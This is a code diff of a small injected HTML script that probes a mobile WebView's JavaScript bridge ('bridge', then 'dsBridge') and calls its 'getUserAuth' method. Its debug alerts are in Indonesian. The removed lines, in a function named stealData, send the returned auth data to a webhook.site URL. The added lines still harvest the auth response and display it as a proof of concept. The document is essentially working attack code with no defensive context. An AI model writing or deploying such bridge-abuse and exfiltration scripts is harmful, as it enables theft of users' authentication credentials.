@@ -1,21 +1,18 @@
 <script>
-function stealData() {
-    alert("script jalan"); // cek script ke-load
+function test() {
+    alert("script jalan");
 
-    if (typeof bridge !== "undefined") {
-        alert("bridge ada"); // cek bridge exist
+    if (typeof dsBridge !== "undefined") {
+        alert("dsBridge ADA");
 
-        bridge.call("getUserAuth", {}, function(resp) {
-            alert("dapet resp: " + JSON.stringify(resp)); // 🔥 paling penting
-
-            location = "https://webhook.site/767aff36-7e40-4fb5-ae1a-93431ada5cab?data=" 
-                + encodeURIComponent(JSON.stringify(resp));
+        dsBridge.call("getUserAuth", {}, function(resp) {
+            alert("dapet: " + JSON.stringify(resp));
         });
 
     } else {
-        alert("bridge ga ada");
+        alert("dsBridge ga ada");
     }
 }
 
-setTimeout(stealData, 1000);
+setTimeout(test, 1000);
 </script>
